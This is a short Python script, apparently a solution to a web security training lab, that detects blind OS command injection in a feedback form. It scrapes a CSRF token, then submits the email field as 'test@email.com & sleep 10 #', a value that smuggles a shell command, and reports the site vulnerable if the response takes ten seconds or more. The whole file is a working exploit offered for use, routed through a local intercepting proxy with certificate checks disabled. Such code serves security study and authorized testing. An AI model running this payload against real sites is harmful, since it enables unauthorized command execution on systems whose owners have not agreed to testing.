import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
  'http' : 'http://127.0.0.1:8080',
  'https' : 'http://127.0.0.1:8080'
}

def get_csrf_token(s, url):
  vuln_path = '/feedback'
  req = s.get((url+vuln_path), verify=False, proxies=proxies)
  soup = BeautifulSoup(req.text, 'html.parser')
  csrf = soup.find('input')['value']
  return csrf

def exploit(s, url):
  vuln_path = '/feedback/submit'
  command_injection = 'test@email.com & sleep 10 #'
  csrf = get_csrf_token(s, url)
  params = {
    'csrf' : csrf,
    'name' : 'test',
    'email' : command_injection,
    'subject' : 'test',
    'message' : 'test'
  }
  make_request = s.post((url+vuln_path), data=params, verify=False, proxies=proxies)
  if (make_request.elapsed.total_seconds() >= 10):
    print("(+) 'email' parameter is vulnerable to Time-based Command Injection.....!")
  else:
    print("(-) email' parameter isn't vulnerable to Time-based Command Injection.....")
    sys.exit(-1)

def main():
  if len(sys.argv) != 2:
    print("(+) Usage Instructions: %s <url>" % sys.argv[0])
    print("(+) Example: %s www.example.com" % sys.argv[0])
    sys.exit(-1)

  url = sys.argv[1]
  print("(+) Checking if the 'email' parameter is vulnerable to Time-based Command Injection.....")
  s = requests.Session()
  exploit(s, url)

if __name__ == "__main__":
  main()